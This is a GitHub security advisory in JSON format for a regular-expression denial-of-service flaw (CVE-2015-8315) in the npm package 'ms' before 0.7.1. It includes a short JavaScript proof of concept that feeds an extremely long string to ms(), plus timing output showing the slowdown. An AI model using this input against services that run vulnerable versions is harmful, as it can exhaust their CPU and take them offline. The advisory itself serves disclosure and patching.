{
 "schema_version": "1.3.0",
 "id": "GHSA-3fx5-fwvr-xrjg",
 "modified": "2021-09-22T20:19:52Z",
 "published": "2017-10-24T18:33:36Z",
 "aliases": [
  "CVE-2015-8315"
 ],
 "summary": "Regular Expression Denial of Service in ms",
 "details": "Versions of `ms` prior to 0.7.1 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.\n\n## Proof of Concept\n```javascript\nvar ms = require('ms');\nvar genstr = function (len, chr) {\n   var result = \"\";\n   for (i=0; i<=len; i++) {\n       result = result + chr;\n   }\n\n   return result;\n}\n\nms(genstr(process.argv[2], \"5\") + \" minutea\");\n\n```\n\n### Results\nShowing increase in execution time based on the input string.\n```\n$ time node ms.js 10000\n\nreal\t0m0.758s\nuser\t0m0.724s\nsys\t0m0.031s\n\n$ time node ms.js 20000\n\nreal\t0m2.580s\nuser\t0m2.494s\nsys\t0m0.047s\n\n$ time node ms.js 30000\n\nreal\t0m5.747s\nuser\t0m5.483s\nsys\t0m0.080s\n\n$ time node ms.js 80000\n\nreal\t0m41.022s\nuser\t0m38.894s\nsys\t0m0.529s\n```\n",
 "severity": [
  {
   "type": "CVSS_V3",
   "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
  }
 ],
 "affected": [
  {
   "package": {
    "ecosystem": "npm",
    "name": "ms"
   },
   "ranges": [
    {
     "type": "ECOSYSTEM",
     "events": [
      {
       "introduced": "0"
      },
      {
       "fixed": "0.7.1"
      }
     ]
    }
   ]
  }
 ],
 "references": [
  {
   "type": "ADVISORY",
   "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-8315"
  },
  {
   "type": "PACKAGE",
   "url": "https://github.com/unshiftio/millisecond/"
  },
  {
   "type": "WEB",
   "url": "https://support.f5.com/csp/article/K46337613?utm_source=f5support&amp;utm_medium=RSS"
  },
  {
   "type": "WEB",
   "url": "https://www.npmjs.com/advisories/46"
  },
  {
   "type": "WEB",
   "url": "http://www.openwall.com/lists/oss-security/2016/04/20/11"
  },
  {
   "type": "WEB",
   "url": "http://www.securityfocus.com/bid/96389"
  }
 ],
 "database_specific": {
  "cwe_ids": [
   "CWE-400"
  ],
  "severity": "HIGH",
  "github_reviewed": true
 },
 "CVSS_score": "7.5",
 "url": "https://github.com/advisories/GHSA-3fx5-fwvr-xrjg"
}